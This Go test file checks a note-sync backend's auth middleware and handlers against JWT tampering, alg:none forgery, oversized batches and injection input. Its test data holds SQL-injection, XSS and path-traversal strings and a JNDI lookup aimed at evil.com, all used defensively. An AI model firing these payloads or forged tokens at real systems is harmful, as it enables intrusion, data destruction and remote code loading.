package handler

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/golang-jwt/jwt/v5"
	"github.com/google/uuid"

	"github.com/anynote/backend/internal/domain"
	"github.com/anynote/backend/internal/testutil"
)

// ---------------------------------------------------------------------------
// Security Test Group 1: JWT Security
// ---------------------------------------------------------------------------

// TestSecurity_JWTTampering_InvalidSignature verifies that a token signed with
// a different secret is rejected by the auth middleware.
func TestSecurity_JWTTampering_InvalidSignature(t *testing.T) {
	wrongSecret := "wrong-secret-at-least-16-chars"

	// Sign a token with a different secret than the one the middleware expects.
	claims := jwt.MapClaims{
		"user_id":    uuid.New().String(),
		"email":      "attacker@evil.com",
		"plan":       "free",
		"token_type": "access",
		"iat":        time.Now().Unix(),
		"exp":        time.Now().Add(1 * time.Hour).Unix(),
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	tokenStr, _ := token.SignedString([]byte(wrongSecret))

	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Error("next handler should not be called with a token signed by wrong secret")
	})

	mw := AuthMiddleware(testJWTSecret)(next)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/sync/pull", nil)
	req.Header.Set("Authorization", "Bearer "+tokenStr)
	rec := httptest.NewRecorder()

	mw.ServeHTTP(rec, req)

	if rec.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", rec.Code)
	}

	var errResp domain.ErrorResponse
	if err := json.NewDecoder(rec.Body).Decode(&errResp); err != nil {
		t.Fatalf("failed to decode error response: %v", err)
	}
	if errResp.Error.Code != "invalid_token" {
		t.Errorf("error code = %q, want %q", errResp.Error.Code, "invalid_token")
	}
}

// TestSecurity_JWTTampering_ModifiedPayload verifies that manually altering the
// payload portion of a valid JWT (after signing) causes rejection.
func TestSecurity_JWTTampering_ModifiedPayload(t *testing.T) {
	// Create a valid token first.
	claims := jwt.MapClaims{
		"user_id":    uuid.New().String(),
		"email":      "user@example.com",
		"plan":       "free",
		"token_type": "access",
		"iat":        time.Now().Unix(),
		"exp":        time.Now().Add(1 * time.Hour).Unix(),
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	validTokenStr, _ := token.SignedString([]byte(testJWTSecret))

	// A valid HS256 token has the structure: base64(header).base64(payload).base64(signature)
	parts := strings.Split(validTokenStr, ".")
	if len(parts) != 3 {
		t.Fatalf("expected 3 JWT parts, got %d", len(parts))
	}

	// Decode the payload, modify the user_id, re-encode.
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		t.Fatalf("failed to decode payload: %v", err)
	}

	// Replace the user_id in the payload with an attacker-controlled value.
	attackerID := uuid.New().String()
	modifiedPayload := strings.Replace(string(payloadBytes), claims["user_id"].(string), attackerID, 1)
	parts[1] = base64.RawURLEncoding.EncodeToString([]byte(modifiedPayload))

	// Reassemble with the original signature (which is now invalid).
	tamperedToken := strings.Join(parts, ".")

	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Error("next handler should not be called with tampered token payload")
	})

	mw := AuthMiddleware(testJWTSecret)(next)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/sync/pull", nil)
	req.Header.Set("Authorization", "Bearer "+tamperedToken)
	rec := httptest.NewRecorder()

	mw.ServeHTTP(rec, req)

	if rec.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", rec.Code)
	}

	var errResp domain.ErrorResponse
	if err := json.NewDecoder(rec.Body).Decode(&errResp); err != nil {
		t.Fatalf("failed to decode error response: %v", err)
	}
	if errResp.Error.Code != "invalid_token" {
		t.Errorf("error code = %q, want %q", errResp.Error.Code, "invalid_token")
	}
}

// TestSecurity_JWT_AlgorithmConfusion verifies that a token with alg:"none"
// (the classic algorithm-confusion attack) is rejected.
func TestSecurity_JWT_AlgorithmConfusion(t *testing.T) {
	// Manually craft a token with alg: "none" and no signature.
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	payload := base64.RawURLEncoding.EncodeToString([]byte(fmt.Sprintf(
		`{"user_id":"%s","email":"attacker@evil.com","plan":"admin","token_type":"access","iat":%d,"exp":%d}`,
		uuid.New().String(), time.Now().Unix(), time.Now().Add(1*time.Hour).Unix(),
	)))

	// The "none" algorithm has an empty signature part.
	forgedToken := header + "." + payload + "."

	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Error("next handler should not be called with alg:none token")
	})

	mw := AuthMiddleware(testJWTSecret)(next)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/sync/pull", nil)
	req.Header.Set("Authorization", "Bearer "+forgedToken)
	rec := httptest.NewRecorder()

	mw.ServeHTTP(rec, req)

	if rec.Code != http.StatusUnauthorized {
		t.Errorf("expected 401 for alg:none token, got %d", rec.Code)
	}

	var errResp domain.ErrorResponse
	if err := json.NewDecoder(rec.Body).Decode(&errResp); err != nil {
		t.Fatalf("failed to decode error response: %v", err)
	}
	if errResp.Error.Code != "invalid_token" {
		t.Errorf("error code = %q, want %q", errResp.Error.Code, "invalid_token")
	}
}

// TestSecurity_RefreshTokenCannotAccessAPI verifies that a refresh token
// (token_type: "refresh") cannot be used to access authenticated API endpoints.
func TestSecurity_RefreshTokenCannotAccessAPI(t *testing.T) {
	userID := uuid.New()
	refreshTokenStr := generateTestRefreshToken(userID.String())

	svc := &mockSyncService{}
	router := setupSyncRouter(svc)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/sync/pull", nil)
	req.Header.Set("Authorization", "Bearer "+refreshTokenStr)
	rec := httptest.NewRecorder()

	router.ServeHTTP(rec, req)

	if rec.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", rec.Code)
	}

	var errResp domain.ErrorResponse
	if err := json.NewDecoder(rec.Body).Decode(&errResp); err != nil {
		t.Fatalf("failed to decode error response: %v", err)
	}
	if errResp.Error.Code != "invalid_token_type" {
		t.Errorf("error code = %q, want %q", errResp.Error.Code, "invalid_token_type")
	}
}

// ---------------------------------------------------------------------------
// Security Test Group 2: Input Validation
// ---------------------------------------------------------------------------

// TestSecurity_SyncPush_OversizedBatch verifies that pushing more than 1000
// blobs in a single request is rejected with batch_too_large.
func TestSecurity_SyncPush_OversizedBatch(t *testing.T) {
	userID := uuid.New()
	svc := &mockSyncService{}
	router := setupSyncRouter(svc)

	// Create 1001 blobs to exceed the 1000-item limit.
	blobs := make([]domain.SyncPushItem, 1001)
	for i := range blobs {
		blobs[i] = domain.SyncPushItem{
			ItemID:        uuid.New(),
			ItemType:      "note",
			Version:       i + 1,
			EncryptedData: []byte("encrypted"),
			BlobSize:      10,
		}
	}
	body, _ := json.Marshal(domain.SyncPushRequest{Blobs: blobs})

	req := httptest.NewRequest(http.MethodPost, "/api/v1/sync/push", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+generateTestToken(userID.String()))
	rec := httptest.NewRecorder()

	router.ServeHTTP(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d; body: %s", rec.Code, rec.Body.String())
	}

	var errResp domain.ErrorResponse
	if err := json.NewDecoder(rec.Body).Decode(&errResp); err != nil {
		t.Fatalf("failed to decode error response: %v", err)
	}
	if errResp.Error.Code != "batch_too_large" {
		t.Errorf("error code = %q, want %q", errResp.Error.Code, "batch_too_large")
	}
}

// TestSecurity_SyncPush_EmptyBatch verifies that an empty blobs array is
// handled gracefully (200 with nil accepted/conflicts).
func TestSecurity_SyncPush_EmptyBatch(t *testing.T) {
	userID := uuid.New()
	svc := &mockSyncService{}
	router := setupSyncRouter(svc)

	body, _ := json.Marshal(domain.SyncPushRequest{Blobs: []domain.SyncPushItem{}})

	req := httptest.NewRequest(http.MethodPost, "/api/v1/sync/push", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+generateTestToken(userID.String()))
	rec := httptest.NewRecorder()

	router.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 for empty batch, got %d; body: %s", rec.Code, rec.Body.String())
	}

	var resp domain.SyncPushResponse
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatalf("failed to decode response: %v", err)
	}
	// Both slices should be nil/empty.
	if len(resp.Accepted) != 0 {
		t.Errorf("expected 0 accepted, got %d", len(resp.Accepted))
	}
	if len(resp.Conflicts) != 0 {
		t.Errorf("expected 0 conflicts, got %d", len(resp.Conflicts))
	}
}

// TestSecurity_AIMessageLimit verifies that sending more than 100 messages
// to the AI proxy endpoint is rejected.
func TestSecurity_AIMessageLimit(t *testing.T) {
	userID := uuid.New()

	aiSvc := &mockAIProxyService{}
	quotaSvc := &mockQuotaSvcForHandler{}
	router := setupAIRouter(aiSvc, quotaSvc)

	// Create 101 messages to exceed the 100-message limit.
	messages := make([]domain.ChatMessage, 101)
	for i := range messages {
		messages[i] = domain.ChatMessage{
			Role:    "user",
			Content: fmt.Sprintf("message %d", i),
		}
	}

	body, _ := json.Marshal(domain.AIProxyRequest{
		Messages: messages,
		Stream:   false,
	})

	req := httptest.NewRequest(http.MethodPost, "/api/v1/ai/proxy", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+generateTestToken(userID.String()))
	rec := httptest.NewRecorder()

	router.ServeHTTP(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d; body: %s", rec.Code, rec.Body.String())
	}

	var errResp domain.ErrorResponse
	if err := json.NewDecoder(rec.Body).Decode(&errResp); err != nil {
		t.Fatalf("failed to decode error response: %v", err)
	}
	if errResp.Error.Code != "validation_error" {
		t.Errorf("error code = %q, want %q", errResp.Error.Code, "validation_error")
	}
}

// TestSecurity_BatchDelete_Oversized verifies that batch delete with more than
// 1000 item IDs is rejected.
func TestSecurity_BatchDelete_Oversized(t *testing.T) {
	userID := uuid.New()
	svc := &mockSyncService{}
	router := setupSyncRouter(svc)

	ids := make([]uuid.UUID, 1001)
	for i := range ids {
		ids[i] = uuid.New()
	}

	body, _ := json.Marshal(domain.BatchDeleteRequest{ItemIDs: ids})

	req := httptest.NewRequest(http.MethodPost, "/api/v1/sync/batch-delete", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+generateTestToken(userID.String()))
	rec := httptest.NewRecorder()

	router.ServeHTTP(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d; body: %s", rec.Code, rec.Body.String())
	}

	var errResp domain.ErrorResponse
	if err := json.NewDecoder(rec.Body).Decode(&errResp); err != nil {
		t.Fatalf("failed to decode error response: %v", err)
	}
	if errResp.Error.Code != "batch_too_large" {
		t.Errorf("error code = %q, want %q", errResp.Error.Code, "batch_too_large")
	}
}

// TestSecurity_BatchDelete_Empty verifies that batch delete with an empty
// item_ids array is rejected with validation_error.
func TestSecurity_BatchDelete_Empty(t *testing.T) {
	userID := uuid.New()
	svc := &mockSyncService{}
	router := setupSyncRouter(svc)

	body, _ := json.Marshal(domain.BatchDeleteRequest{ItemIDs: []uuid.UUID{}})

	req := httptest.NewRequest(http.MethodPost, "/api/v1/sync/batch-delete", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+generateTestToken(userID.String()))
	rec := httptest.NewRecorder()

	router.ServeHTTP(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d; body: %s", rec.Code, rec.Body.String())
	}

	var errResp domain.ErrorResponse
	if err := json.NewDecoder(rec.Body).Decode(&errResp); err != nil {
		t.Fatalf("failed to decode error response: %v", err)
	}
	if errResp.Error.Code != "validation_error" {
		t.Errorf("error code = %q, want %q", errResp.Error.Code, "validation_error")
	}
}

// ---------------------------------------------------------------------------
// Security Test Group 3: Authorization
// ---------------------------------------------------------------------------

// TestSecurity_CrossUserAccess_SyncPull verifies that the middleware correctly
// extracts the user_id from the JWT and passes it to the service layer. The
// handler must never use a hardcoded or missing user identity.
func TestSecurity_CrossUserAccess_SyncPull(t *testing.T) {
	userA := uuid.New()
	userB := uuid.New()

	// The mock verifies that the service receives the correct user_id from the
	// token -- user A's token must produce user A's ID, never user B's.
	svc := &mockSyncService{
		pullFn: func(ctx context.Context, uid uuid.UUID, sinceVersion int, limit int, cursor int) (*domain.SyncPullResponse, error) {
			if uid == userB {
				t.Error("service received user B's ID when user A's token was used -- cross-user leak")
			}
			if uid != userA {
				t.Errorf("service received userID = %v, want %v", uid, userA)
			}
			return &domain.SyncPullResponse{
				Blobs:         []domain.SyncBlob{},
				LatestVersion: 0,
			}, nil
		},
	}

	router := setupSyncRouter(svc)

	// Use user A's token.
	req := httptest.NewRequest(http.MethodGet, "/api/v1/sync/pull", nil)
	req.Header.Set("Authorization", "Bearer "+generateTestToken(userA.String()))
	rec := httptest.NewRecorder()

	router.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d; body: %s", rec.Code, rec.Body.String())
	}
}

// TestSecurity_MissingAuth_SyncEndpoints verifies that all sync endpoints
// return 401 when no Authorization header is provided.
func TestSecurity_MissingAuth_SyncEndpoints(t *testing.T) {
	svc := &mockSyncService{}
	router := setupSyncRouter(svc)

	endpoints := []struct {
		name   string
		method string
		path   string
		body   interface{}
	}{
		{"sync/pull", http.MethodGet, "/api/v1/sync/pull", nil},
		{"sync/push", http.MethodPost, "/api/v1/sync/push", domain.SyncPushRequest{Blobs: []domain.SyncPushItem{}}},
		{"sync/status", http.MethodGet, "/api/v1/sync/status", nil},
	}

	for _, ep := range endpoints {
		t.Run(ep.name, func(t *testing.T) {
			var bodyReader *bytes.Reader
			if ep.body != nil {
				b, _ := json.Marshal(ep.body)
				bodyReader = bytes.NewReader(b)
			} else {
				bodyReader = bytes.NewReader(nil)
			}

			req := httptest.NewRequest(ep.method, ep.path, bodyReader)
			if ep.body != nil {
				req.Header.Set("Content-Type", "application/json")
			}
			// Intentionally do NOT set Authorization header.
			rec := httptest.NewRecorder()

			router.ServeHTTP(rec, req)

			if rec.Code != http.StatusUnauthorized {
				t.Errorf("%s: expected 401, got %d", ep.name, rec.Code)
			}

			var errResp domain.ErrorResponse
			if err := json.NewDecoder(rec.Body).Decode(&errResp); err != nil {
				t.Fatalf("%s: failed to decode error response: %v", ep.name, err)
			}
			// All should return missing_authorization when no header is present.
			if errResp.Error.Code != "missing_authorization" {
				t.Errorf("%s: error code = %q, want %q", ep.name, errResp.Error.Code, "missing_authorization")
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Security Test Group 4: SQL Injection Vectors
// ---------------------------------------------------------------------------

// TestSecurity_SpecialCharsInSyncBlob verifies that SQL injection strings in
// the item_id field are safely handled. Since the handler layer uses typed
// uuid.UUID fields (not raw string interpolation), injection payloads will
// simply fail UUID parsing. This test validates that the handler does not
// perform unsafe string concatenation.
func TestSecurity_SpecialCharsInSyncBlob(t *testing.T) {
	userID := uuid.New()

	// The SyncPushItem.ItemID is a uuid.UUID, so injection strings will not
	// parse as valid UUIDs. We test with a valid UUID but use an item_type
	// field that contains SQL-like special characters. The handler passes
	// these through to the service as-is; the repository layer uses
	// parameterized queries so this is safe.
	injectionStrings := []string{
		"'; DROP TABLE sync_blobs; --",
		"\" OR 1=1 --",
		"${jndi:ldap://evil.com/a}",
		"<script>alert('xss')</script>",
	}

	for _, injection := range injectionStrings {
		t.Run("item_type_"+shortName(injection), func(t *testing.T) {
			var capturedItemType string
			svc := &mockSyncService{
				pushFn: func(ctx context.Context, uid uuid.UUID, req domain.SyncPushRequest) (*domain.SyncPushResponse, error) {
					if len(req.Blobs) > 0 {
						capturedItemType = req.Blobs[0].ItemType
					}
					return &domain.SyncPushResponse{
						Accepted: []uuid.UUID{req.Blobs[0].ItemID},
					}, nil
				},
			}

			router := setupSyncRouter(svc)

			pushReq := domain.SyncPushRequest{
				Blobs: []domain.SyncPushItem{
					{
						ItemID:        uuid.New(),
						ItemType:      injection,
						Version:       1,
						EncryptedData: []byte("encrypted-data"),
						BlobSize:      14,
					},
				},
			}
			body, _ := json.Marshal(pushReq)

			req := httptest.NewRequest(http.MethodPost, "/api/v1/sync/push", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Authorization", "Bearer "+generateTestToken(userID.String()))
			rec := httptest.NewRecorder()

			router.ServeHTTP(rec, req)

			// The handler should pass the request through successfully.
			// The repository layer's parameterized queries prevent injection.
			if rec.Code != http.StatusOK {
				t.Fatalf("expected 200, got %d; body: %s", rec.Code, rec.Body.String())
			}

			// Verify the value was passed through unchanged (no sanitization
			// at the handler level, which is correct -- the DB layer handles safety).
			if capturedItemType != injection {
				t.Errorf("item_type was altered: got %q, want %q", capturedItemType, injection)
			}
		})
	}
}

// TestSecurity_SpecialCharsInUsername verifies that the username validation
// regex rejects special characters, preventing injection of HTML/JS/SQL via
// the registration endpoint.
func TestSecurity_SpecialCharsInUsername(t *testing.T) {
	svc := &mockAuthService{}
	router := setupAuthRouter(svc)

	maliciousUsernames := []struct {
		name     string
		username string
	}{
		{"xss_script", "<script>alert('xss')</script>"},
		{"sql_injection", "admin'; DROP TABLE users; --"},
		{"ldap_injection", "admin)(&))"},
		{"null_byte", "user\x00admin"},
		{"unicode_homoglyph", "аdmin"}, // Cyrillic 'а' (U+0430) instead of Latin 'a'
		{"path_traversal", "../../../etc/passwd"},
	}

	for _, tc := range maliciousUsernames {
		t.Run(tc.name, func(t *testing.T) {
			body, _ := json.Marshal(domain.RegisterRequest{
				Email:       "test@example.com",
				Username:    tc.username,
				AuthKeyHash: []byte("hash"),
			})

			req := httptest.NewRequest(http.MethodPost, "/api/v1/auth/register", bytes.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()

			router.ServeHTTP(rec, req)

			// The username regex ^[a-zA-Z0-9_-]+$ should reject all of these.
			if rec.Code != http.StatusUnprocessableEntity {
				t.Errorf("expected 422 for username %q, got %d; body: %s", tc.username, rec.Code, rec.Body.String())
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Additional Security Edge Cases
// ---------------------------------------------------------------------------

// TestSecurity_JWT_ShortSecretPanics verifies that AuthMiddleware panics if
// initialized with a secret shorter than 16 characters, preventing weak keys.
func TestSecurity_JWT_ShortSecretPanics(t *testing.T) {
	defer func() {
		r := recover()
		if r == nil {
			t.Error("expected panic when JWT secret is too short, but did not panic")
		}
		msg, ok := r.(string)
		if !ok {
			t.Errorf("expected string panic, got %T: %v", r, r)
			return
		}
		if !strings.Contains(msg, "at least 16") {
			t.Errorf("panic message = %q, want mention of 'at least 16'", msg)
		}
	}()

	// This should panic.
	AuthMiddleware("short")
}

// TestSecurity_TestCaseInsensitiveBearer verifies that both "Bearer" and
// "bearer" (and other casings) are accepted per RFC 6750.
func TestSecurity_TestCaseInsensitiveBearer(t *testing.T) {
	secret := testutil.DefaultTestJWTSecret
	userID := testutil.RandomUUID()

	tokenStr := testutil.GenerateAccessToken(t, userID)

	casers := []struct {
		name   string
		prefix string
	}{
		{"uppercase", "Bearer "},
		{"lowercase", "bearer "},
		{"mixed", "BeArEr "},
	}

	for _, c := range casers {
		t.Run(c.name, func(t *testing.T) {
			called := false
			next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				called = true
				extracted := getUserID(r.Context())
				if extracted != userID {
					t.Errorf("user_id = %q, want %q", extracted, userID)
				}
				w.WriteHeader(http.StatusOK)
			})

			mw := AuthMiddleware(secret)(next)

			req := httptest.NewRequest(http.MethodGet, "/test", nil)
			req.Header.Set("Authorization", c.prefix+tokenStr)
			rec := httptest.NewRecorder()

			mw.ServeHTTP(rec, req)

			if !called {
				t.Error("next handler should be called")
			}
			if rec.Code != http.StatusOK {
				t.Errorf("expected 200, got %d", rec.Code)
			}
		})
	}
}

// TestSecurity_ExpiredTokenRejected verifies that an expired JWT is rejected
// even if it was signed with the correct secret.
func TestSecurity_ExpiredTokenRejected(t *testing.T) {
	secret := testutil.DefaultTestJWTSecret

	claims := jwt.MapClaims{
		"user_id":    testutil.RandomUUID(),
		"email":      "test@example.com",
		"plan":       "free",
		"token_type": "access",
		"iat":        time.Now().Add(-2 * time.Hour).Unix(),
		"exp":        time.Now().Add(-1 * time.Hour).Unix(), // expired 1 hour ago
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	tokenStr, _ := token.SignedString([]byte(secret))

	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Error("next should not be called with expired token")
	})

	mw := AuthMiddleware(secret)(next)

	req := httptest.NewRequest(http.MethodGet, "/test", nil)
	req.Header.Set("Authorization", "Bearer "+tokenStr)
	rec := httptest.NewRecorder()

	mw.ServeHTTP(rec, req)

	if rec.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", rec.Code)
	}
}

// TestSecurity_BearerTokenOnly_PrefixWithoutToken verifies that sending
// "Bearer " (with empty token) is rejected.
func TestSecurity_BearerTokenOnly_PrefixWithoutToken(t *testing.T) {
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Error("next should not be called with empty bearer token")
	})

	mw := AuthMiddleware(testJWTSecret)(next)

	req := httptest.NewRequest(http.MethodGet, "/test", nil)
	req.Header.Set("Authorization", "Bearer ")
	rec := httptest.NewRecorder()

	mw.ServeHTTP(rec, req)

	if rec.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", rec.Code)
	}

	var errResp domain.ErrorResponse
	if err := json.NewDecoder(rec.Body).Decode(&errResp); err != nil {
		t.Fatalf("failed to decode error response: %v", err)
	}
	if errResp.Error.Code != "invalid_authorization" {
		t.Errorf("error code = %q, want %q", errResp.Error.Code, "invalid_authorization")
	}
}

// TestSecurity_SyncPush_ExactlyAtLimit verifies that exactly 1000 blobs
// (the maximum) is accepted.
func TestSecurity_SyncPush_ExactlyAtLimit(t *testing.T) {
	userID := uuid.New()

	svc := &mockSyncService{
		pushFn: func(ctx context.Context, uid uuid.UUID, req domain.SyncPushRequest) (*domain.SyncPushResponse, error) {
			if len(req.Blobs) != 1000 {
				t.Errorf("expected 1000 blobs, got %d", len(req.Blobs))
			}
			accepted := make([]uuid.UUID, 1000)
			for i, b := range req.Blobs {
				accepted[i] = b.ItemID
			}
			return &domain.SyncPushResponse{Accepted: accepted}, nil
		},
	}

	// Use a router with elevated body size limit for this large payload.
	r := chi.NewRouter()
	r.Use(RequestLogger)
	h := &SyncHandler{syncService: svc}
	r.Group(func(r chi.Router) {
		r.Use(MaxBodySize(50*1024*1024)) // 50 MB for sync push
		r.Use(AuthMiddleware(testJWTSecret))
		r.Post("/api/v1/sync/push", h.Push)
	})

	blobs := make([]domain.SyncPushItem, 1000)
	for i := range blobs {
		blobs[i] = domain.SyncPushItem{
			ItemID:   uuid.New(),
			ItemType: "note",
			Version:  i + 1,
		}
	}
	body, _ := json.Marshal(domain.SyncPushRequest{Blobs: blobs})

	req := httptest.NewRequest(http.MethodPost, "/api/v1/sync/push", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+generateTestToken(userID.String()))
	rec := httptest.NewRecorder()

	r.ServeHTTP(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("expected 200 for exactly 1000 blobs, got %d; body: %s", rec.Code, rec.Body.String())
	}
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// shortName returns a short safe name for test sub-test names derived from
// potentially long or special-character-laden strings.
func shortName(s string) string {
	if len(s) > 20 {
		return s[:20]
	}
	return s
}
